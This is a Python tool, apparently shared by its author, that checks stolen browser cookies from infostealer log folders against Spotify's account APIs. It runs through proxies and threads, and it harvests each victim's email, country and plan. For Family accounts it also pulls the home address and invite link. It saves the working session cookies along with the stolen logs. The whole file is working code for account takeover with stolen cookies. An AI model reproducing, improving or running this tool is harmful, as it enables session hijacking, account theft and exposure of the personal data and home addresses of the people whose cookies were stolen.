import requests
import re
from datetime import datetime
import os
import ctypes
import shutil
from concurrent.futures import ThreadPoolExecutor
import threading
from requests.exceptions import JSONDecodeError
import webbrowser
from latest_user_agents import get_random_user_agent
import easygui
from conn import conn
import colorama
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
class SPOTIFYCOOKIE:
    def __init__(self) -> None:
        self.invalids = 0
        self.valids = 0
        self.Total = 0
        self.glob_tr=True
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[SPOTIFY COOKIE Checker]--BY @BINARY_THUG|VALIDS:{self.valids}|INVALIDS:{self.invalids}|TOTAL LOGS FOLDER:{len(lin)}")

    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'SPOTIFY COOKIE COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
███████╗██████╗      ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████╗██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
╚════██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
███████║██║         ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚══════╝╚═╝          ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                             
                                                                                                                               
                                                                                                                                                                  
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))

    def center(self, var: str, space: int = None):
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())   
    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append((os.path.join(root, dir),root))
        return set(paths)
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def checker(self, path,datetime,filuy,logfilename,saveorono):
        for root, dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookie, NF_LINES = self.net_to_cookie(full_path, "spotify")
                    if not cookie:
                        print(colorama.Fore.RED+"[!] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        self.invalids += 1
                        continue
                    else:
                        cookie_string = "; ".join([f"{name}={value}" for name, value in cookie.items()])
                        headers = {
                        'Host': 'www.spotify.com',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://www.spotify.com/us/account/manage-your-plan/',
                        'Connection': 'close',
                        'Cookie': cookie_string,
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'Pragma': 'no-cache',
                        'Cache-Control': 'no-cache',
                        'TE': 'trailers'
                         }

                        self.url = "https://www.spotify.com/us/api/account/v2/plan/"
                        client = requests.Session()
                        repo=conn((client.get),self.url,headers=headers,filesname=filuy)
                        try:
                            name=repo.json()['plan']['name']
                            self.valids=self.valids+1
                            print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        except JSONDecodeError:
                            print(colorama.Fore.RED+"[!] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                            self.invalids=self.invalids+1
                            return None
                        self.uri="https://www.spotify.com/api/account-settings/v1/profile"
                        repos=conn((client.get),self.uri,headers=headers,filesname=filuy)
                        email=repos.json()['profile']['email']
                        country=repos.json()['options']['available_countries']
                        if name=="Spotify Free":
                            plan="FREE"     
                        else:
                            plan="PREMIUM"
                        if "Family" in name:
                            try:
                                manitab="https://www.spotify.com/api/family/v1/family/home"
                                muskany=conn((client.get),manitab,headers=headers,filesname=filuy)
                                addres=muskany.json()["address"]
                                isfamilyowner=True
                                invite_token = muskany.json().get('inviteToken')
                                is_child_accounts = len(muskany.json().get('members'))
                                country_value = muskany.json().get('members')[0]['country']
                                ivitw=f"https://www.spotify.com/{country_value}/family/join/invite/{invite_token}/"
                                hemidal=f"\n===========================\nINVITELINK:{ivitw}\nADDDRESS:{addres}\nTOTALSLOT:6/{is_child_accounts}\n===========================\n"
                                with open(os.path.join(datetime,"invites.txt"),"a",errors='ignore',encoding='utf-8') as meimei:
                                   meimei.write(hemidal)
                            except:
                                isfamilyowner=False
                            if isfamilyowner==False:
                                hemidal=""
                            else:
                                pass         
                        else:
                            hemidal=""
                            

                        txtvar=f'[{email}][{name}].txt'
                        dcitvar=f'[{email}][{name}]'
                        if os.path.exists(os.path.join(datetime,dcitvar)):
                            pass
                        else:
                            os.mkdir(os.path.join(datetime,dcitvar))
                        jj=os.path.join(datetime,dcitvar)
                        output_path = os.path.join(datetime,jj,txtvar+".txt")
                        with open(output_path, 'w', errors="ignore", encoding='latin-1') as ramdi:
                                    for lines in NF_LINES:
                                        ramdi.write(lines)
                                    ramdi.write("\n")
                                    ramdi.write(str("="*20))
                                    ramdi.write(f"\nBY @BINARY_THUG \nEmail:{email}\nCountry:{country}\nPlan:{plan}\nBenefits:{name}\n")
                                    ramdi.write(f"{hemidal}")
                        if plan=="PREMIUM":
                            try:
                                if hemidal=="":
                                    pass
                                else:
                                    pass
                            except:
                                pass
                        if saveorono==True:
                            maaz=os.path.join(jj,'LOG')
                            shutil.copytree(logfilename,maaz)
                        
    def runner(self,logs_path,workers,datetime,proxy,yesorono):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.checker,pat[0],datetime,proxy,pat[1],yesorono)
                except Exception as e:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
        
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)                

def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def main():
    os.system("cls")
    maximize_console_window()
    os.system("cls")
    NF=SPOTIFYCOOKIE()
    NF.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        logs_pathi=easygui.diropenbox(title="SPCOOKIE CHECKER- SELECT LOGS FOLDER")
        p=easygui.fileopenbox(title="SPCOOKIE CHECKER- SELECT HTTPS OR HTTP PROXY FILE",filetypes=["*.txt"],multiple=False)
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>26:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 25 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
            
        os.system("cls")
        log=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"DO U WANT TO SAVE LOGS(YES OR NO):")
        if log=='YES':
            log=True
        else:
            log=False
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        NF.runner(logs_pathi,int(thread_num),s,proxy=p,yesorono=log)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR SPOTIFY COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[SPOTIFY COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{NF.valids}|INVALIDS:{NF.invalids}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()
